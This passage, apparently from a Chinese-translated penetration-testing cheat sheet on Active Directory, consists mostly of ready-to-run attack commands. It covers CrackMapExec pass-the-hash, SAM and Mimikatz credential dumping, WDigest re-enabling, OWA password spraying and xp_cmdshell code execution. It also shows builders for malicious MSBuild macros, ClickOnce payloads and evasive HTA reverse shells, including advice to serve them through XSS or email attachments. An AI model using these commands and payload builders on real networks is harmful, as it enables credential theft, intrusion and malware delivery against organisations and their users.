class="code"><pre><code class="hljs powershell">CrackMapExec安装在Kali上或从Github获取Windows二进制文件。<br><br>Has <span class="hljs-number">3</span> Execution Methods<br>crackmapexec smb &lt;- 通过SMB创建和运行服务<br>crackmapexec wmi &lt;- 通过WMI执行命令<br>crackmapexec at &lt;- 使用任务调度器调度任务<br><br>可以使用<span class="hljs-literal">-X</span>标志i/e执行普通命令<br><br>crcakmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">14.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-x</span> whoami<br><br>crcakmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">14.0</span>/<span class="hljs-number">24</span> &lt;- Host Discovery<br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">14.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-u</span> user <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">14.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-u</span> user <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--pass-pol</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">14.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-u</span> user <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--shares</span><br><br><br>也可以PTH与CME<br><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">14.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-u</span> user <span class="hljs-literal">-H</span> e8bcd502fbbdcd9379305dca15f4854e<br><br>cme smb <span class="hljs-number">10.8</span>.<span class="hljs-number">14.14</span> <span class="hljs-literal">-u</span> Administrator <span class="hljs-literal">-H</span> aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e <span class="hljs-literal">--local-auth</span> <span class="hljs-literal">--shares</span> <br><br><br><span class="hljs-literal">--</span> 本地身份验证用于与本地管理员进行身份验证，如果Organisaton通过网络使用相同的本地管理员哈希而不使用LAPS，则效果良好<br><br>转储本地SAM哈希<br><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">14.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-u</span> user <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--local-auth</span> <span class="hljs-literal">--sam</span><br><br>运行 Mimikatz ：<br><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">14.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-u</span> user <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--local-auth</span> <span class="hljs-literal">-M</span> mimikatz<br><br>^ 噪音很大，但是的，你可以在整个网络范围内运行mimikatz。RIP域管理员<br><br>枚举杀软产品：<br><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">14.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-u</span> user <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--local-auth</span> <span class="hljs-literal">-M</span> enum_avproducts<br></code></pre></td></tr></table></figure>
<h2 id="Mail-喷洒攻击"><a href="#Mail-喷洒攻击" class="headerlink" title="Mail 喷洒攻击"></a>Mail 喷洒攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-PasswordSprayOWA</span> <span class="hljs-literal">-ExchHostname</span> m0chanAD.local <span class="hljs-literal">-userlist</span> harvestedUsers.txt <span class="hljs-literal">-password</span> Summer2019<br><br>[*] Now spraying the OWA portal at https://m0chanAD.local/owa/<br><br>[*] SUCCESS! User:m0chan:Summer2019<br><br>Lmao，你真的认为我会使用<span class="hljs-number">2019</span>年夏季通行证吗？<br></code></pre></td></tr></table></figure>
<h2 id="使用PowerShell读取Exchange电子邮件"><a href="#使用PowerShell读取Exchange电子邮件" class="headerlink" title="使用PowerShell读取Exchange电子邮件"></a>使用PowerShell读取Exchange电子邮件</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$outlook</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> outlook.application<br><span class="hljs-variable">$olFolders</span> =<span class="hljs-string">&quot;Microsoft.Office.Interop.Outlook.OlDefaultFolders&quot;</span> <span class="hljs-operator">-as</span> [<span class="hljs-type">type</span>]<br><span class="hljs-variable">$namespace</span> = <span class="hljs-variable">$Outlook</span>.GetNameSpace(<span class="hljs-string">&quot;MAPI&quot;</span>)<br><span class="hljs-variable">$inbox</span> = <span class="hljs-variable">$namespace</span>.GetDefaultFolder(<span class="hljs-variable">$olFolders::olFolderInbox</span>)<br><span class="hljs-variable">$inbox</span>.items.count<br><span class="hljs-variable">$inbox</span>.items<br><span class="hljs-variable">$inbox</span>.items.GetLast()<br></code></pre></td></tr></table></figure>
<h2 id="Kerberos-攻击内容参考链接"><a href="#Kerberos-攻击内容参考链接" class="headerlink" title="Kerberos 攻击内容参考链接"></a>Kerberos 攻击内容参考链接</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</span><br><span class="hljs-comment"># https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br></code></pre></td></tr></table></figure>
<h2 id="MSSQL利用漏洞（PowerUpSQL）"><a href="#MSSQL利用漏洞（PowerUpSQL）" class="headerlink" title="MSSQL利用漏洞（PowerUpSQL）"></a>MSSQL利用漏洞（PowerUpSQL）</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/NetSPI/PowerUpSQL</span><br><br><span class="hljs-comment"># View SQL Instances</span><br><span class="hljs-built_in">Get-SQLInstanceDomain</span> [| <span class="hljs-built_in">Get-SQLServerInfo</span>]<br><br><span class="hljs-comment"># Login in with Domain Account</span><br><span class="hljs-built_in">Get-SQLConnectionTestThreaded</span><br><br><span class="hljs-comment"># Login in with Default Password</span><br><span class="hljs-built_in">Get-SQLServerDefaultLoginPw</span><br><br><span class="hljs-comment"># List DB, Tables &amp; Columns</span><br><br><span class="hljs-built_in">Get-SQLInstanceDomain</span> | <span class="hljs-built_in">Get-SQLDatabase</span><br><span class="hljs-built_in">Get-SQLInstanceDomain</span> | <span class="hljs-built_in">Get-SQLTable</span> <span class="hljs-literal">-DatabaseName</span> &lt;DB_name&gt;<br><span class="hljs-built_in">Get-SQLInstanceDomain</span> | <span class="hljs-built_in">Get-SQLColumn</span> <span class="hljs-literal">-DatabaseName</span> &lt;DB_name&gt; <span class="hljs-literal">-TableName</span> &lt;Table_name&gt;<br><br><span class="hljs-comment"># Search Column Names for Word</span><br><br><span class="hljs-built_in">Get-SQLInstanceDomain</span> | <span class="hljs-built_in">Get-SQLColumnSampleData</span> <span class="hljs-literal">-Keywords</span> <span class="hljs-string">&quot;&lt;word1,word2&gt;&quot;</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-literal">-SampleSize</span> <span class="hljs-number">10</span><br><br><span class="hljs-comment"># Try to Execute Commands (RCE)</span><br><br><span class="hljs-built_in">Invoke-SQLOSCmd</span><br><br><br><span class="hljs-comment">#Enable XP_CMDShell Process</span><br><br>EXEC sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;  <br>go  <br>RECONFIGURE;  <br>go  <br>EXEC sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;  <br>go  <br>RECONFIGURE;  <br>go  <br>xp_cmdshell <span class="hljs-string">&#x27;&lt;cmd&gt;&#x27;</span><br>go<br></code></pre></td></tr></table></figure>
<h2 id="带有MSBuild的恶意宏"><a href="#带有MSBuild的恶意宏" class="headerlink" title="带有MSBuild的恶意宏"></a>带有MSBuild的恶意宏</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/infosecn1nja/MaliciousMacroMSBuild</span><br><br><span class="hljs-comment"># https://lolbas-project.github.io/lolbas/Binaries/Msbuild/ - MSBuild Explained</span><br><br>Shellcode MSBuild VBA宏的创建：<br>python m3<span class="hljs-literal">-gen</span>.py <span class="hljs-literal">-p</span> shellcode <span class="hljs-literal">-i</span> /path/beacon.bin <span class="hljs-literal">-o</span> output.vba<br><br>创建PowerShell MSBuild VBA宏：<br>python m3<span class="hljs-literal">-gen</span>.py <span class="hljs-literal">-p</span> powershell <span class="hljs-literal">-i</span> /path/payload.ps1 <span class="hljs-literal">-o</span> output.vba<br><br>创建自定义MSBuild VBA宏：<br>python m3<span class="hljs-literal">-gen</span>.py <span class="hljs-literal">-p</span> custom <span class="hljs-literal">-i</span> /path/msbuild.xml <span class="hljs-literal">-o</span> output.vba<br><br>创建具有终止日期的Shellcode MSBuild VBA宏：<br>python m3<span class="hljs-literal">-gen</span>.py <span class="hljs-literal">-p</span> shellcode <span class="hljs-literal">-i</span> /path/beacon.bin <span class="hljs-literal">-o</span> output.vba <span class="hljs-literal">-k</span> <span class="hljs-number">20</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2018</span><br><br>使用环境键控创建Shellcode MSBuild VBA宏：<br>python m3<span class="hljs-literal">-gen</span>.py <span class="hljs-literal">-p</span> shellcode <span class="hljs-literal">-i</span> /path/beacon.bin <span class="hljs-literal">-o</span> output.vba <span class="hljs-literal">-d</span> yourdomain<br>python m3<span class="hljs-literal">-gen</span>.py <span class="hljs-literal">-p</span> shellcode <span class="hljs-literal">-i</span> /path/beacon.bin <span class="hljs-literal">-o</span> output.vba <span class="hljs-literal">-d</span> yourdomain, microsoft, github<br></code></pre></td></tr></table></figure>
<h2 id="ClickOnce-MSBuild-负载"><a href="#ClickOnce-MSBuild-负载" class="headerlink" title="ClickOnce MSBuild 负载"></a>ClickOnce MSBuild 负载</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/hausec/MaliciousClickOnceMSBuild</span><br><br><span class="hljs-number">1</span>） 创建一个新的。Visual Studio中的NET Framework控制台项目 <br><span class="hljs-number">2</span>） 从此存储库导入程序.cs <br><span class="hljs-number">3</span>） 将MSBuild负载文件添加到项目 <br><span class="hljs-number">4</span>） 发布项目<br><br></code></pre></td></tr></table></figure>
<h2 id="怪异HTA-无法检测的HTA"><a href="#怪异HTA-无法检测的HTA" class="headerlink" title="怪异HTA-无法检测的HTA"></a>怪异HTA-无法检测的HTA</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/felamos/weirdhta</span><br><br>python3 <span class="hljs-literal">--help</span><br>python3 weirdhta.py <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span> <span class="hljs-number">4444</span> <span class="hljs-literal">--normal</span> (<span class="hljs-keyword">for</span> normal powershell reverse_shell)<br>python3 weirdhta.py <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span> <span class="hljs-number">4444</span> <span class="hljs-literal">--smb</span> (without powershell payload, it will use smb)<br>python3 weirdhta.py <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span> <span class="hljs-number">4444</span> <span class="hljs-literal">--powercat</span> (<span class="hljs-keyword">for</span> powercat)<br>python3 weirdhta.py <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span> <span class="hljs-number">4444</span> <span class="hljs-literal">--command</span> <span class="hljs-string">&#x27;c:\windows\system32\cmd.exe&#x27;</span> (custom command)<br><br></code></pre></td></tr></table></figure>
<h2 id="EvilWinRM-工具帮助信息"><a href="#EvilWinRM-工具帮助信息" class="headerlink" title="EvilWinRM 工具帮助信息"></a>EvilWinRM 工具帮助信息</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/Hackplayers/evil-winrm</span><br><br>Ultimate Shell <span class="hljs-keyword">for</span> WinRM Connections<br><br>Usage: evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> IP <span class="hljs-literal">-u</span> USER [-<span class="hljs-type">s</span> <span class="hljs-type">SCRIPTS_PATH</span>] [-<span class="hljs-type">e</span> <span class="hljs-type">EXES_PATH</span>] [-<span class="hljs-type">P</span> <span class="hljs-type">PORT</span>] [-<span class="hljs-type">p</span> <span class="hljs-type">PASS</span>] [-<span class="hljs-type">U</span> <span class="hljs-type">URL</span>] [-<span class="hljs-type">S</span>] [-<span class="hljs-type">c</span> <span class="hljs-type">PUBLIC_KEY_PATH</span> ] [-<span class="hljs-type">k</span> <span class="hljs-type">PRIVATE_KEY_PATH</span> ]<br>    <span class="hljs-literal">-S</span>, <span class="hljs-literal">--ssl</span>                        Enable SSL<br>    <span class="hljs-literal">-c</span>, <span class="hljs-literal">--pub-key</span> PUBLIC_KEY_PATH    Local path to public key certificate<br>    <span class="hljs-literal">-k</span>, <span class="hljs-literal">--priv-key</span> PRIVATE_KEY_PATH  Local path to private key certificate<br>    <span class="hljs-literal">-s</span>, <span class="hljs-literal">--scripts</span> PS_SCRIPTS_PATH    Powershell scripts local path<br>    <span class="hljs-literal">-e</span>, <span class="hljs-literal">--executables</span> EXES_PATH      C<span class="hljs-comment"># executables local path</span><br>    <span class="hljs-literal">-i</span>, <span class="hljs-literal">--ip</span> IP                      Remote host IP or hostname (required)<br>    <span class="hljs-literal">-U</span>, <span class="hljs-literal">--url</span> URL                    Remote url endpoint (default /wsman)<br>    <span class="hljs-literal">-u</span>, <span class="hljs-literal">--user</span> USER                  Username (required)<br>    <span class="hljs-literal">-p</span>, <span class="hljs-literal">--password</span> PASS              Password<br>    <span class="hljs-literal">-P</span>, <span class="hljs-literal">--port</span> PORT                  Remote host port (default <span class="hljs-number">5985</span>)<br>    <span class="hljs-literal">-V</span>, <span class="hljs-literal">--version</span>                    Show version<br>    <span class="hljs-literal">-h</span>, <span class="hljs-literal">--help</span>                       Display this help message<br><br></code></pre></td></tr></table></figure>
<h2 id="GetVulnerableGPO-工具"><a href="#GetVulnerableGPO-工具" class="headerlink" title="GetVulnerableGPO 工具"></a>GetVulnerableGPO 工具</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/gpoguy/GetVulnerableGPO</span><br><br>PowerShell脚本，用于查找应强化的“易受攻击”的安全相关GPO（有关更多背景信息，请参阅此博客的GPO可发现性部分：https://sdmsoftware.com/<span class="hljs-built_in">group-policy</span><span class="hljs-literal">-blog</span>/security<span class="hljs-literal">-related</span>/security<span class="hljs-literal">-fun-bloodhound-ms16-072-gpo-discoverability</span>/)需要GPMC和SDM软件GPMC PowerShell模块（用于在搜索过程中更容易地解析<span class="hljs-built_in">GP</span>设置）：https://s3.amazonaws.com/sdmsoftware.com/dl/SDM<span class="hljs-literal">-GPMC-Module2</span>.<span class="hljs-number">0</span>Setup.zip<br><br></code></pre></td></tr></table></figure>
<h2 id="Invoke-PSImage-工具"><a href="#Invoke-PSImage-工具" class="headerlink" title="Invoke-PSImage 工具"></a>Invoke-PSImage 工具</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/peewpw/Invoke-PSImage</span><br><br>以PNG文件的像素对PowerShell脚本进行编码，并生成要执行的oneliner<br><br>InvokePSImage获取PowerShell脚本，并将脚本的字节编码为PNG图像的像素。它生成一个oneliner，用于从文件或从web执行。<br><br><span class="hljs-built_in">PS</span>&gt;<span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-PSImage</span>.ps1<br><span class="hljs-built_in">PS</span>&gt;<span class="hljs-built_in">Invoke-PSImage</span> <span class="hljs-literal">-Script</span> .\<span class="hljs-built_in">Invoke-Mimikatz</span>.ps1 <span class="hljs-literal">-Out</span> .\evil<span class="hljs-literal">-kiwi</span>.png <span class="hljs-literal">-Image</span> .\kiwi.jpg<br>   [<span class="hljs-type">Oneliner</span> <span class="hljs-type">to</span> <span class="hljs-type">execute</span> <span class="hljs-type">from</span> <span class="hljs-type">a</span> <span class="hljs-type">file</span>]<br>   <br>   <br><span class="hljs-built_in">PS</span>&gt;<span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-PSImage</span>.ps1<br><span class="hljs-built_in">PS</span>&gt;<span class="hljs-built_in">Invoke-PSImage</span> <span class="hljs-literal">-Script</span> .\<span class="hljs-built_in">Invoke-Mimikatz</span>.ps1 <span class="hljs-literal">-Out</span> .\evil<span class="hljs-literal">-kiwi</span>.png <span class="hljs-literal">-Image</span> .\kiwi.jpg <span class="hljs-literal">-WebRequest</span><br>   [<span class="hljs-type">Oneliner</span> <span class="hljs-type">to</span> <span class="hljs-type">execute</span> <span class="hljs-type">from</span> <span class="hljs-type">the</span> <span class="hljs-type">web</span>]<br><br></code></pre></td></tr></table></figure>
<p>Meterpeter+Donut-外壳代码注入 .NET</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html</span><br><br>一个用于在Meterpeter中执行任意外壳代码的模块，也就是在内存中执行Mimikatz，反射式和交互式！<br><br>donut <span class="hljs-operator">-f</span> /tmp/mimikatz.exe <span class="hljs-literal">-a</span> <span class="hljs-number">2</span> <span class="hljs-literal">-o</span> /tmp/payload.bin<br><br>use post/windows/manage/shellcode_inject<br><span class="hljs-built_in">set</span> SHELLCODE /tmp/payload.bin<br><span class="hljs-built_in">set</span> SESSION <span class="hljs-number">1</span><br>run<br><br></code></pre></td></tr></table></figure>
<p>DemiGuise - 加密HTA</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/nccgroup/demiguise</span><br><br>运行demiguise.py文件，为其提供加密密钥、有效负载类型、输出文件名和您希望运行HTA的命令。<br><br>Example: python demiguise.py <span class="hljs-literal">-k</span> hello <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;notepad.exe&quot;</span> <span class="hljs-literal">-p</span> Outlook.Application <span class="hljs-literal">-o</span><br><br>由于该工具输出的是一个包含JavaScript的HTML文件，因此您可以简单地使用此JS并将其托管在任何您喜欢的地方。这意味着，如果您的客户端网站容易受到反射XSS的攻击，您可以使用它从他们（高度信任）的域中提供您的HTA文件。<br><br>此外，Outlook默认情况下不会阻止.html附件，其他一些应用程序也不会阻止-发挥你的想象力！：）<br><br></code></pre></td></tr></table></figure>
<h2 id="Grouper2-工具"><a href="#Grouper2-工具" class="headerlink" title="Grouper2 工具"></a>Grouper2 工具</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/l0ss/Grouper2</span><br><br>查找AD组策略中的漏洞<br><br>Grouper2是Pentester的一个工具，用于帮助查找Active Directory组策略中与安全相关的错误配置。<br></code></pre></td></tr></table></figure>
<p>Microsoft SQL 攻击内容参考链接</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">https://book.hacktricks.xyz/pentesting/pentesting<span class="hljs-literal">-mssql-microsoft-sql-server</span><br></code></pre></td></tr></table></figure>
<h2 id="CrackMapExec-常用命令"><a href="#CrackMapExec-常用命令" class="headerlink" title="CrackMapExec 常用命令"></a>CrackMapExec 常用命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/</span><br><br>Command Execution - CMD.exe<br><br>crackmapexec <span class="hljs-number">192.168</span>.<span class="hljs-number">10.11</span> <span class="hljs-literal">-u</span> Administrator <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;P@ssw0rd&#x27;</span> <span class="hljs-literal">-x</span> whoami<br><br>Command Execution - Powershell.exe<br><br>crackmapexec <span class="hljs-number">192.168</span>.<span class="hljs-number">10.11</span> <span class="hljs-literal">-u</span> Administrator <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;P@ssw0rd&#x27;</span> <span class="hljs-literal">-x</span> whoami<br><br>Check <span class="hljs-keyword">For</span> Logged <span class="hljs-keyword">in</span> Users<br><br>crackmapexec <span class="hljs-number">192.168</span>.<span class="hljs-number">215.104</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;Administrator&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;PASS&#x27;</span> <span class="hljs-literal">--lusers</span><br><br><span class="hljs-keyword">Using</span> Local Auth<br><br>crackmapexec <span class="hljs-number">192.168</span>.<span class="hljs-number">215.138</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;Administrator&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;PASSWORD&#x27;</span> <span class="hljs-literal">--local-auth</span><br><br>Enumerating Shares<br><br>crackmapexec <span class="hljs-number">192.168</span>.<span class="hljs-number">215.138</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;Administrator&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;PASSWORD&#x27;</span> <span class="hljs-literal">--local-auth</span> <span class="hljs-literal">--shares</span><br><br>WDigest Enable/Disable<br><br>“这允许我们重新启用WDigest提供程序并从LSA内存转储明文凭据”<br><br>crackmapexec <span class="hljs-number">192.168</span>.<span class="hljs-number">215.104</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;Administrator&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;PASS&#x27;</span> <span class="hljs-literal">--local-auth</span> <span class="hljs-literal">--wdigest</span> enable<br>crackmapexec <span class="hljs-number">192.168</span>.<span class="hljs-number">215.104</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;Administrator&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;PASS&#x27;</span> <span class="hljs-literal">--local-auth</span> <span class="hljs-literal">--wdigest</span> disable<br><br>Password Policy<br><br>crackmapexec <span class="hljs-number">192.168</span>.<span class="hljs-number">215.104</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;Administrator&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;PASS --pass-pol</span><br><span class="hljs-string"></span><br><span class="hljs-string">RID Bruteforcing</span><br><span class="hljs-string"></span><br><span class="hljs-string">crackmapexec 192.168.215.104 -u &#x27;</span>Administrator<span class="hljs-string">&#x27; -p &#x27;</span>PASS <span class="hljs-literal">--rid-brute</span><br><br>Top Credential Attacks<br><br>crackmapexec <span class="hljs-number">192.168</span>.<span class="hljs-number">215.104</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;Administrator&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;PASS&#x27;</span> <span class="hljs-literal">--local-auth</span> <span class="hljs-literal">--sam</span><br><br>Pass Hash Subnet<br><br>cme smb <span class="hljs-number">172.16</span>.<span class="hljs-number">157.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-u</span> administrator <span class="hljs-literal">-H</span> <span class="hljs-string">&#x27;aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51&#x27;</span> <span class="hljs-literal">--local-auth</span><br><br>Null Sessions<br><br>crackmapexec smb &lt;target(s)&gt; <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><br>Modules - Enum_Chrome<br><br>sudo cme <span class="hljs-number">192.168</span>.<span class="hljs-number">215.104</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;Administrator&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;PASS&#x27;</span> <span class="hljs-literal">--local-auth</span> <span class="hljs-literal">-M</span> enum_chrome<br><br>Modules - Enum_AV<br><br>sudo cme <span class="hljs-number">192.168</span>.<span class="hljs-number">215.104</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;Administrator&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;PASS&#x27;</span> <span class="hljs-literal">--local-auth</span> <span class="hljs-literal">-m</span> enum_avproducts<br></code></pre></td></tr></table></figure>
